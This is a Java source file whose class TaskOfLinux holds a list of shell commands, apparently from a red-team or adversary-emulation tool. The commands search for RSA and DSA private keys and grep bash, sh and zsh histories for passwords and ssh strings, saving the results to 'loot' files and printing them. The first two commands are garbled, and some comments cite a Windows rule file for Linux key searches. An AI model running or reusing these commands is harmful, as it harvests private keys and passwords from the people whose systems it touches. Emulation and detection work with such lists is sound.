package cl;

import java.util.ArrayList;
import java.util.List;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author cefa-dico-asus
 */
public class TaskOfLinux {
    
    private List<String> comandos=new ArrayList<String>();
    
    public TaskOfLinux (){
        comandos.add("/-irw -e \"BEGIN RSA PRIVATE\" 2>/dev/null > rsa_keys.txt");//credaccess_win_createaccount.yml
        comandos.add("/-irw -e \"BEGIN DSA PRIVATE\" 2>/dev/null > dsa_keys.txt");//credaccess_win_createaccount.yml
        comandos.add("cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_bash.txt");//credaccess_linux_bash_history.yml
        comandos.add("cat loot_bash.txt");//credaccess_linux_bash_history.yml
        comandos.add("cat ~/.sh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_sh.txt");//credaccess_linux_bash_history.yml
        comandos.add("cat loot_sh.txt");//credaccess_linux_bash_history.yml
        comandos.add("cat ~/.zsh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_zsh.txt");//credaccess_linux_bash_history.yml
        comandos.add("cat loot_zsh.txt");//credaccess_linux_bash_history.yml        
    }
    
    public List<String> getComand(){
        return comandos;
    }
    
    
}
